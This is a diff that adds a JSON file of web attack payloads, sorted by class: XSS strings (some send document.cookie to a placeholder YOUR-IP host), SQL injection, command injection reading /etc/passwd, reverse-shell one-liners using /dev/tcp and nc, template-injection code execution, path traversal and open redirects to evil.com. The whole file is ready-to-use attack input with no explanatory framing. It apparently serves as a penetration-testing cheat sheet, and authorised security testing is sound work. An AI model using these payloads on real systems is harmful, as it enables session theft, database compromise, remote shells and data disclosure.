@@ -1,0 +1,31 @@
+{
+  "xss": {
+    "basic": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "<body onload=alert(1)>", "<details open ontoggle=alert(1)>"],
+    "blind": ["<script src=http://YOUR-IP/x.js></script>", "<img src=x onerror=this.src='http://YOUR-IP/?c='+document.cookie>", "<svg/onload=fetch('http://YOUR-IP/'+btoa(document.cookie))>"],
+    "dom": ["\";alert(1);//", "';alert(1);//", "javascript:alert(1)", "#<img src=x onerror=alert(1)>", "data:text/html,<svg/onload=alert(1)>"],
+    "filter": ["<scr<script>ipt>alert(1)</scr<script>ipt>", "<svg><script>alert(1)</script></svg>", "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>"]
+  },
+  "sqli": {
+    "basic": ["' OR '1'='1'-- -", "' OR 1=1-- -", "\" OR \"1\"=\"1\"-- -"],
+    "union": ["' UNION SELECT 1,2,3-- -", "' UNION SELECT null,null-- -", "' ORDER BY 2 #"],
+    "error": ["' AND updatexml(1,concat(0x7e,user()),1)-- -", "' AND extractvalue(1,concat(0x7e,version()))-- -"],
+    "time": ["' AND sleep(5)-- -", "' OR IF(1=1,sleep(5),0)-- -"]
+  },
+  "cmd": {
+    "basic": [";id", "|id", "$(id)", "`id`"],
+    "read": [";cat /etc/passwd", ";ls -la /", "|whoami"],
+    "blind": [";sleep 5", "|ping -c 5 127.0.0.1"],
+    "reverse": ["bash -i >& /dev/tcp/YOUR-IP/4444 0>&1", "nc YOUR-IP 4444 -e /bin/bash"]
+  },
+  "ssti": {
+    "basic": ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"],
+    "rce": ["{{self.__init__.__globals__.os.popen('id').read()}}", "{{cycler.__init__.__globals__.os.popen('whoami').read()}}"]
+  },
+  "lfi": {
+    "basic": ["../../../../../etc/passwd", "../../../../proc/self/environ", "/etc/passwd%00"],
+    "log": ["../../../../var/log/nginx/access.log", "../../../../var/log/apache2/access.log"]
+  },
+  "redirect": {
+    "basic": ["//evil.com", "https://evil.com", "/\\\\evil.com"]
+  }
+}
